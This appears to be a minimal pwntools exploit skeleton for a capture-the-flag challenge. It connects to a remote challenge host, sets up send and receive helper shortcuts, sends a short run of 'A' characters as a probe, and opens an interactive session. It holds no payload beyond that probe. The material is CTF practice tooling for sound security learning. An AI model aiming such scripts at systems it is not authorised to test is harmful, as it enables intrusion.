from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p = remote("chal.sigpwny.com", 1351)
ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
# gdb.attach(p)
sla("go\n", "AAAAAAAAA")
p.interactive()
